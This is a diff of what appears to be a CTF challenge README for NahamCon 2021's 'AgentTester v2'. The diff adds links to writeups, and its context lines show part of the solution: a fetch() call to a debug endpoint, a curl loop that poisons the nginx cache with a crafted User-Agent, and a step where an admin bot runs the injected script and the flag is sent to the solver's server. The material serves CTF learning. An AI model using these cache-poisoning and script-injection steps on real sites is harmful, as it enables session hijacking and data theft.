@@ -4,9 +4,14 @@
 
 We've recently hired an entry-level web developer to build an internal system to test User Agents, let us know if you find any error!
 
-## Solution
+## Writeups
 
 * [Solver](https://gist.github.com/jorgectf/d6a01fa0d8ba3905196b9b41a78ab4d1)
+* [Juanan](https://ikasten.io/2021/03/15/nahamcon2021-ctf-agenttester-challenge-writeup/)
+* [lanjelot](https://thegoonies.github.io/2021/03/15/nahamconctf-2021-agent-tester-v2/)
+* [b4bergi](https://github.com/b4bergi/ctf-writeups/blob/main/nahamcon-2021/AgentTesterV2.md)
+
+## Solution
 
 * Create an account
 * Go to Profile
@@ -23,8 +28,6 @@ fetch('/debug', {method: 'POST', headers: new Headers({'Content-Type': 'applicat
 while true; do curl -I chall-ip/profile/<your-id> -b "auth=<your-auth>" -H "User-Agent: NotARandomString"; sleep 1; done
 ```
 * Wait for the bot to visit `http://nginx/profile/<your-id>` (cached aka `X-Cache-Status: HIT`), execute that JS and receive the flag in your server.
-
-
 
 ## Expected behaviour
 ```
